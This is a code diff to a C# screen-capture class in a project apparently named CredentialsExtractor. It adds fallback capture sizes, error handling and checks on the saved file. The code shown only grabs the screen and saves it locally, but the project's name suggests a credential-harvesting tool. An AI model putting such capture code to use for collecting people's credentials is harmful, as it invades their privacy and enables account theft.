@@ -1,10 +1,8 @@
-﻿using System;
+﻿// ScreenCapture.cs
 using System.Drawing;
 using System.Drawing.Imaging;
-using System.IO;
 using CredentialsExtractor.Configuration;
 using CredentialsExtractor.Logging;
-using System.Text;
 
 namespace CredentialsExtractor.Core
 {
@@ -28,45 +26,129 @@ namespace CredentialsExtractor.Core
             {
                 try
                 {
+                    // Validate screen capture dimensions
+                    int width = _config.ScreenshotWidth;
+                    int height = _config.ScreenshotHeight;
+                    int startY = _config.ScreenshotStartY;
+
                     // Create a unique filename
                     screenshotPath = Path.Combine(
                         _config.ScreenshotDirectory,
                         $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss_fff}.png");
 
-                    // Capture the screenshot with specified dimensions
-                    using (Bitmap screenshot = new Bitmap(_config.ScreenshotWidth, _config.ScreenshotHeight))
+                    // Create the screenshot bitmap outside of using block to allow for fallback
+                    Bitmap screenshotBitmap = null;
+
+                    try
                     {
-                        using (Graphics g = Graphics.FromImage(screenshot))
+                        // First attempt with configured dimensions
+                        screenshotBitmap = new Bitmap(width, height);
+                        using (Graphics g = Graphics.FromImage(screenshotBitmap))
                         {
                             // Improve performance with these settings
                             g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;
                             g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
                             g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
+                            g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
 
                             // Capture screen area
-                            g.CopyFromScreen(0, _config.ScreenshotStartY, 0, 0, screenshot.Size);
+                            g.CopyFromScreen(0, startY, 0, 0, screenshotBitmap.Size);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        _logger.Log($"Error during screen capture: {ex.Message}");
+
+                        // Dispose the failed bitmap if it was created
+                        if (screenshotBitmap != null)
+                        {
+                            screenshotBitmap.Dispose();
+                            screenshotBitmap = null;
                         }
 
-                        // Create image encoder based on configured preferences
-                        var encoderFactory = new ImageEncoderFactory();
-                        IImageEncoder encoder;
+                        // Attempt with more conservative dimensions
+                        if (width > 800 && height > 600)
+                        {
+                            try
+                            {
+                                screenshotBitmap = new Bitmap(800, 600);
+                                using (Graphics g = Graphics.FromImage(screenshotBitmap))
+                                {
+                                    g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;
+                                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
+                                    g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
+                                    g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
 
+                                    g.CopyFromScreen(0, startY, 0, 0, screenshotBitmap.Size);
+                                }
+                            }
+                            catch (Exception fallbackEx)
+                            {
+                                _logger.Log($"Fallback screen capture failed: {fallbackEx.Message}");
+
+                                // Dispose the fallback bitmap if it was created
+                                if (screenshotBitmap != null)
+                                {
+                                    screenshotBitmap.Dispose();
+                                }
+
+                                return string.Empty;
+                            }
+                        }
+                        else
+                        {
+                            return string.Empty;
+                        }
+                    }
+
+                    // If we got this far, we have a valid screenshot
+                    if (screenshotBitmap != null)
+                    {
                         try
                         {
-                            encoder = encoderFactory.CreateEncoder(ImageFormat.Jpeg, 80);
-                            screenshotPath = Path.ChangeExtension(screenshotPath, encoder.FileExtension);
-                        }
-                        catch
-                        {
-                            // Fall back to PNG if JPEG encoder not available
-                            encoder = encoderFactory.CreateEncoder(ImageFormat.Png);
-                            screenshotPath = Path.ChangeExtension(screenshotPath, encoder.FileExtension);
-                        }
+                            // Create image encoder based on configured preferences
+                            var encoderFactory = new ImageEncoderFactory();
+                            IImageEncoder encoder;
 
-                        // Save the screenshot
-                        using (FileStream fs = new FileStream(screenshotPath, FileMode.Create, FileAccess.Write))
+                            try
+                            {
+                                encoder = encoderFactory.CreateEncoder(ImageFormat.Jpeg, 80);
+                                screenshotPath = Path.ChangeExtension(screenshotPath, encoder.FileExtension);
+                            }
+                            catch
+                            {
+                                // Fall back to PNG if JPEG encoder not available
+                                encoder = encoderFactory.CreateEncoder(ImageFormat.Png);
+                                screenshotPath = Path.ChangeExtension(screenshotPath, encoder.FileExtension);
+                            }
+
+                            // Create directory if it doesn't exist
+                            Directory.CreateDirectory(Path.GetDirectoryName(screenshotPath));
+
+                            // Save the screenshot
+                            using (FileStream fs = new FileStream(screenshotPath, FileMode.Create, FileAccess.Write))
+                            {
+                                encoder.SaveImage(fs, screenshotBitmap);
+                            }
+
+                            // Clean up the bitmap
+                            screenshotBitmap.Dispose();
+
+                            // Verify the file was created successfully
+                            if (!File.Exists(screenshotPath) || new FileInfo(screenshotPath).Length == 0)
+                            {
+                                _logger.Log("Screenshot file was not created or is empty");
+                                return string.Empty;
+                            }
+                        }
+                        catch (Exception ex)
                         {
-                            encoder.SaveImage(fs, screenshot);
+                            _logger.Log($"Error saving screenshot: {ex.Message}");
+
+                            // Clean up bitmap on error
+                            screenshotBitmap.Dispose();
+
+                            return string.Empty;
                         }
                     }
                 }
